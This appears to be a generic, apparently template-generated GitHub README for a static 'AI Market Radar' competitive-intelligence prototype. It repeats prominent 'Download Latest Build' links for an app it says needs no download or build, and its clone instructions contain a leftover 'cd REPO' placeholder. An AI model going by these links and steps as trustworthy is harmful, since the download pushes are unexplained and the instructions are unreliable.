# AI Market Radar - Competitive Intelligence Prototype 2026

> **AI Market Radar is a static web application prototype for examining AI-supported competitive intelligence in travel booking. It brings role-based workflows, watchlists, news tracking, and market planning together in one interface.**

[![Platform](https://img.shields.io/badge/Platform-Web-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-Prototype-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/colechrisvfv9577/ai-market-radar-intel?style=flat-square)](https://github.com/colechrisvfv9577/ai-market-radar-intel)

---

<p align="center">
  <a href="https://colechrisvfv9577.github.io/ai-market-radar-intel/">
    <img src="https://img.shields.io/badge/Download-AI%20Market%20Radar%20Latest-brightgreen?style=for-the-badge" alt="Download AI Market Radar">
  </a>
</p>

> **[Download AI Market Radar prototype](https://colechrisvfv9577.github.io/ai-market-radar-intel/)**

---

[Download Latest Build](https://colechrisvfv9577.github.io/ai-market-radar-intel/)

---

## What AI Market Radar Provides

AI Market Radar is an independent concept prototype for teams investigating competitive activity in the travel-booking market. The interface presents market observations through role-specific views and supports scored watchlists, promotion review queues, roadmap planning, and a feed of collected public news.

Because it is built as a static application, the project can be examined and discussed without a build pipeline or application server. The prototype also contains an Assistant Lab matrix, category labels, promotion-trigger detection, optional Claude triage, and keyword tagging for workflows that do not use Claude.

---

## Capabilities

- Five role-oriented views for examining the product from different responsibilities.
- Permission walls that illustrate access limits within the prototype.
- Sign-and-publish flow for reviewing prepared intelligence before release.
- Assistant Lab matrix for structuring AI-focused analysis routes.
- Scored watchlist for ranking items under observation.
- Promotion queue with trigger detection to identify items for additional review.
- Roadmap board for relating market observations to planned work.
- Collected public news feed with category tagging.
- Optional Claude triage, with keyword tagging as an alternative.
- SVG export for documenting or sharing the modeled system flow.
- Static project files that work without a server or build step.

---

## Getting Started

Clone the repository, then move into its directory:

```bash
git clone https://github.com/colechrisvfv9577/ai-market-radar-intel.git
cd REPO
```

For the basic prototype, open the main HTML file in a modern browser. The static application does not require package installation, compilation, or a local server.

If direct file access is restricted by the browser, serve the repository with Python:

```bash
python -m http.server 8000
```

Open `http://localhost:8000/` in your browser.

---

## Exploring the Prototype

The following sequence represents one possible intelligence-review workflow:

1. Launch the interface and choose the role-based view that matches the activity.
2. Examine the public news collection and assign category tags.
3. Review existing watchlist entries or add items to the scored watchlist.
4. Look for promotion triggers and send appropriate entries to the promotion queue.
5. Compare available analysis routes in the Assistant Lab matrix.
6. Run Claude triage when it is enabled; otherwise, use keyword tagging.
7. Check the sign-and-publish process before releasing an intelligence item.
8. Record resulting priorities and follow-up tasks on the roadmap board.
9. Export the system flow to SVG when a diagram is useful.

The application is intended to be explored in a browser as a demonstration and evaluation environment for the competitive-intelligence concept.

---

## Local Configuration

AI Market Radar keeps its configuration within the static project files instead of relying on a hosted service or database.

To adapt the local prototype:

- Inspect the repository's HTML, CSS, and JavaScript files.
- Modify the applicable static data or markup for sample categories, watchlist records, and workflow content.
- Set up optional Claude triage only where the project includes a related configuration or integration point.
- Leave keyword tagging available when Claude triage has not been configured.

The default static experience does not need build configuration.

---

## Requirements

- A modern web browser.
- A local repository checkout or access to the hosted static build.
- No application server or build step for the standard use case.
- Python is optional for serving the files locally and is unnecessary when opening the static files directly.
- Enough local storage for the repository contents and any SVG diagrams you export.

---

## Frequently Asked Questions

### Who should use AI Market Radar?

The prototype is aimed at people examining competitive-intelligence processes, especially those working with AI and travel booking. It also gives teams a way to consider how collected market signals could progress through prioritization and publication.

### Is AI Market Radar a commercial product?

No. AI Market Radar is an independent concept prototype, not a commercial product.

### Where can I find the newest version?

Select [Download Latest Build](https://colechrisvfv9577.github.io/ai-market-radar-intel/) or retrieve the latest changes from the GitHub repository.

### Are dependencies required?

No. The basic static web application does not need dependency installation or a build process. A Python server is available as an optional way to serve the files through `localhost`.

### What options are available for triage?

Claude triage can be used when it is enabled. If Claude is unavailable or has not been configured, keyword tagging offers another method for classifying content.

### Why are certain areas unavailable?

The permission walls represent the prototype's role-based access model. Try the appropriate role-based view or inspect the project configuration when evaluating access behavior.

### How can I troubleshoot a page that does not load properly?

Verify that all repository files are present, serve the project with a local Python server, and reload it in a modern browser. If the problem remains, compare the local checkout against the newest repository version.

### Is workflow export supported?

Yes. The prototype can export its system flow as an SVG diagram.

---

## Planned Work

- Further tune the five role-based views and their permission boundaries.
- Add more examples for watchlist scoring and promotion triggers.
- Strengthen the path from news collection and tagging through roadmap planning.
- Broaden the Assistant Lab scenarios used for competitive-intelligence review.
- Continue assessing Claude triage together with the keyword-based fallback.
- Expand guidance for local customization and SVG flow export.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
